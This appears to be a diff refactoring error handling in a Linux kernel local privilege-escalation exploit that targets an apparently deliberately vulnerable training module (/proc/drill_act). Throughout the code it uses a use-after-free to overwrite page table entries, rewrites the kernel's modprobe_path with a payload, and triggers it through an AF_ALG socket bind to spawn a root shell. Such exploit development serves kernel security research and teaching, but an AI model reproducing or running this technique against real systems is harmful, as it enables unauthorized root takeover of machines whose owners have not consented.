@@ -33,7 +33,7 @@
 #define STR_EXPAND(arg) #arg
 #define STR(arg) STR_EXPAND(arg)
 
-void do_cpu_pinning(void)
+int do_cpu_pinning(void)
 {
 	int ret = 0;
 	cpu_set_t single_cpu;
@@ -44,10 +44,11 @@ void do_cpu_pinning(void)
 	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
 	if (ret != 0) {
 		perror("[-] sched_setaffinity");
-		exit(EXIT_FAILURE);
+		return EXIT_FAILURE;
 	}
 
 	printf("[+] pinned to CPU #0\n");
+	return EXIT_SUCCESS;
 }
 
 int act(int act_fd, int code, int n, char *args)
@@ -123,7 +124,7 @@ int prepare_page_tables()
 	*(unsigned int*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
 	if (retv == MAP_FAILED) {
 		perror("[-] mmap");
-		exit(EXIT_FAILURE);
+		return EXIT_FAILURE;
 	}
 
 	/* pre-register new tables and entries */
@@ -133,7 +134,7 @@ int prepare_page_tables()
 	}
 	if (retv == MAP_FAILED) {
 		perror("[-] mmap");
-		exit(EXIT_FAILURE);
+		return EXIT_FAILURE;
 	}
 	printf("[+] done, PTE is ready for allocation\n");
 
@@ -149,38 +150,25 @@ int prepare_page_tables()
 #define FLUSH_STAT_DONE 1
 #define SLEEPLOCK(cmp) while (cmp) { usleep(10 * 1000); }
 
-long read_file(const char *filename, void *buf, size_t buflen)
-{
-	long fd;
-	long retv;
-
-	fd = open(filename, O_RDONLY);
-	if (fd < 0) {
-		perror("[-] open");
-		exit(EXIT_FAILURE);
-	}
-
-	retv = read(fd, buf, buflen);
-	if (retv < 0) {
-		perror("[-] read");
-		exit(EXIT_FAILURE);
-	}
-	close(fd);
-
-	return retv;
-}
-
 static long get_modprobe_path(char *buf, size_t buflen)
 {
-	long size;
+	int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
+    if (fd < 0) {
+        perror("[-] open");
+        return EXIT_FAILURE;
+    }
 
-	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);
-	if (size == buflen)
-		printf("[!] read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN?\n");
-	buf[size-1] = '\x00'; /* cleanup line end */
+	ssize_t bytes = read(fd, buf, buflen - 1);
+    close(fd);
+    
+    if (bytes < 0) {
+        perror("[-] read");
+        return EXIT_FAILURE;
+    }
+	buf[bytes-1] = '\x00'; /* cleanup line end */
+
 	printf("[+] current modprobe path: %s\n", buf);
-
-	return size;
+	return 0;
 }
 
 
@@ -200,7 +188,7 @@ char *prepare_payload(void)
 		shell_stdin_fd, pid, shell_stdout_fd) == 0) {
 
 		perror("[-] payload fd\n");
-		exit(EXIT_FAILURE);
+		return NULL;
 	}
 
 	lseek(modprobe_script_fd, 0, SEEK_SET);
@@ -217,21 +205,23 @@ char *prepare_payload(void)
  * refers to:
  * https://blog.theori.io/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch-2dcb8f0fae04
 */
-void modprobe_trigger_sock(void)
+int modprobe_trigger_sock(void)
 {
-		struct sockaddr_alg sa;
+	struct sockaddr_alg sa;
 
-		int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
-		if (alg_fd < 0) {
-			perror("[-] crypto socker setup\n");
-			exit(EXIT_FAILURE);
-		}
+	int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+	if (alg_fd < 0) {
+		perror("[-] crypto socker setup\n");
+		return EXIT_FAILURE;
+	}
 
-		memset(&sa, 0, sizeof(sa));
-		sa.salg_family = AF_ALG;
-		strcpy((char *)sa.salg_type, "dummy");  /* dummy string */
+	memset(&sa, 0, sizeof(sa));
+	sa.salg_family = AF_ALG;
+	strcpy((char *)sa.salg_type, "dummy");  /* dummy string */
 
-		bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
+	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* root shell will start here */
+
+	return 0;
 }
 
 /* The exploit can work without it, but will be less reliable */
@@ -262,22 +252,21 @@ long UAF_write(long phys_addr, long uaf_n, long act_fd)
 	char data_for_drill[16];
 	long flags = PT_FLAGS;
 
-	/* can work with multiple objects by switching between them one by one */
 	snprintf(data_for_drill, sizeof(data_for_drill),
 			 "0x%08lx" " %d", phys_addr + flags, 0);
-	 /* switch object each 64 bytes */
-	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
-	if (ret == EXIT_FAILURE)
-		exit(EXIT_FAILURE);
 
-	return 0;
+	return act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
 }
 
 static int strcmp_modprobe_path(char *new_str)
 {
+	int ret;
 	char buf[KMOD_PATH_LEN] = { '\x00' };
 
-	get_modprobe_path(buf, KMOD_PATH_LEN);
+	ret = get_modprobe_path(buf, KMOD_PATH_LEN);
+	if (ret != 0) {
+		return EXIT_FAILURE;
+	}
 
 	return strncmp(new_str, buf, KMOD_PATH_LEN);
 }
@@ -318,9 +307,13 @@ int main(void)
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
-	prepare_page_tables();
+	ret = prepare_page_tables();
+	if (ret == EXIT_FAILURE)
+		goto end;
 
-	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
+	ret = get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
+	if (ret == EXIT_FAILURE)
+		goto end;
 	modprobe_path_len = strlen(modprobe_path);
 
 	act_fd = open("/proc/drill_act", O_WRONLY);
@@ -331,7 +324,8 @@ int main(void)
 	printf("[+] drill_act is opened\n");
 
 	printf("[!] pin the process to a single CPU\n");
-	do_cpu_pinning();
+	if (do_cpu_pinning() == EXIT_FAILURE)
+		goto end;
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
@@ -413,7 +407,9 @@ int main(void)
 
 	long phys_addr = MODPROBE_PATH_ADDR_PART;
 	/* doing rewrite to change page table entries */
-	UAF_write(phys_addr, uaf_n, act_fd);
+	ret = UAF_write(phys_addr, uaf_n, act_fd);
+	if (ret == EXIT_FAILURE)
+		goto end;
 	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000); /* 0x200000 = 4 KiB per 512 pages */
 
 	for (int i = 0; i < ENTRIES_AMOUNT; i++) {
@@ -430,6 +426,8 @@ int main(void)
 				printf("[!] create an exploit fd and write its path as new modprobe path via the overwritten target object\n");
 
 				char *privesc = prepare_payload();
+				if (privesc  == NULL)
+					goto end;
 				strcpy(modprobe_addr, privesc);
 
 				printf("[+] done, triggering a corrupted modprobe to launch a root shell\n");
